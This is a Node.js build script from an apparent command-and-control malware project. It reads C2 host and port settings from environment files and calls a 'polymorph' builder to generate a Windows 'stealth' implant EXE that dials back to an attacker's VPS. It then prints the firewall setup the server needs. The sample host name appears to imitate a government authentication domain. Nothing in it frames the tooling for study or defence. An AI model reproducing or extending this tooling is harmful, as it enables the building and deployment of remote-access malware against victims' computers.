#!/usr/bin/env node
/**
 * Build Windows stealth EXE using .env.production C2 settings (must match VPS TCP_PORT).
 */
const path = require('path');
const fs = require('fs');
const dotenv = require('dotenv');

const root = path.join(__dirname, '..');
const prodEnv = path.join(root, '.env.production');
const fallback = path.join(root, '.env');

// Keep CLI env when building: e.g. BUILD_C2_PORT=443 node scripts/build-production-exe.js
const cli = {
  BUILD_C2_HOST: process.env.BUILD_C2_HOST,
  BUILD_C2_PORT: process.env.BUILD_C2_PORT,
  TCP_PORT: process.env.TCP_PORT,
  ENABLE_443_SPLIT: process.env.ENABLE_443_SPLIT,
  PLAIN_PORT: process.env.PLAIN_PORT,
};

if (fs.existsSync(prodEnv)) {
  dotenv.config({ path: prodEnv, override: true });
} else if (fs.existsSync(fallback)) {
  dotenv.config({ path: fallback, override: true });
}
for (const [k, v] of Object.entries(cli)) {
  if (v !== undefined && v !== '') process.env[k] = v;
}

function is443SplitEnabled() {
  const v = process.env.ENABLE_443_SPLIT;
  return v === '1' || v === 'true' || v === 'yes';
}

/** Port burned into the EXE (what the implant dials on the public hostname). */
function resolveEmbedPort() {
  if (is443SplitEnabled()) {
    return Number(process.env.BUILD_C2_PORT || process.env.SPLIT_PORT || 443);
  }
  const httpPort = Number(process.env.PORT || 5000);
  let tcp = Number(process.env.TCP_PORT || process.env.BUILD_C2_PORT || 2026);
  if (tcp === httpPort) tcp = 2026;
  return tcp;
}

const host = String(process.env.BUILD_C2_HOST || process.env.PUBLIC_C2_HOST || '').trim();
const port = resolveEmbedPort();
const listenPort = is443SplitEnabled()
  ? Number(process.env.PLAIN_PORT || process.env.TCP_PORT || 1443)
  : port;

if (!host) {
  console.error('Set BUILD_C2_HOST in .env.production (e.g. milauth-mygovin.serveftp.com)');
  process.exit(1);
}

process.env.APP_ENV = 'production';

const { generateBuild } = require('../builder/polymorph');

generateBuild({
  platform: 'windows',
  arch: 'amd64',
  variant: 'implant',
  host,
  port,
})
  .then((m) => {
    console.log('\n=== Production stealth EXE ready ===');
    console.log('C2 (embedded):', m.host + ':' + m.port);
    console.log('File:', m.latestStealthExe || path.join(root, 'builds', 'working', 'latest-stealth.exe'));
    console.log('SHA256:', m.sha256);
    if (is443SplitEnabled()) {
      console.log('VPS listens (local): 0.0.0.0:' + listenPort + ' — forward public TCP', m.port, '→', listenPort);
    } else {
      console.log('VPS must show: [TCP] Server listening on 0.0.0.0:' + m.port);
      if (m.port === 443) {
        console.log('Port 443: stop nginx/apache on 443 OR only Node may bind 443. ufw allow 443/tcp');
      } else {
        console.log('Firewall: ufw allow ' + m.port + '/tcp');
      }
    }
  })
  .catch((e) => {
    console.error('Build failed:', e.message);
    process.exit(1);
  });
